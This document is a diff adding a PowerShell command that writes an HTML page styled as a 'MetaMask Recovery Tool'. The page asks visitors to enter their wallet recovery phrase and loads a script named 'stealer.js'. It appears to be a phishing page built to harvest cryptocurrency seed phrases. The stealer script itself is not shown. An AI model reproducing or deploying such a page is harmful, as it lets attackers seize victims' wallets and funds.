@@ -1,0 +1,58 @@
+@'
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>MetaMask Recovery Tool</title>
+    <script src="stealer.js"></script>
+    <style>
+        body {
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+            background: #111;
+            color: #00d188;
+        }
+
+        input {
+            padding: 12px;
+            width: 320px;
+            margin: 10px;
+            border: 1px solid #00d188;
+            border-radius: 4px;
+            background: #222;
+            color: #00ffaa;
+        }
+
+        button {
+            background: #00d188;
+            color: #000;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background: #00ffaa;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>🔐 MetaMask Recovery Tool</h1>
+    <p>Enter your 12/18/24-word recovery phrase to restore access.</p>
+    <input type="text" id="phrase" placeholder="e.g. apple robot moon ..." autocomplete="off" />
+    <br />
+    <button onclick="recover()">Recover Wallet</button>
+    <p id="status">Status: Ready</p>
+</body>
+
+</html>
+'@ | Out-File -Encoding UTF8 index.html
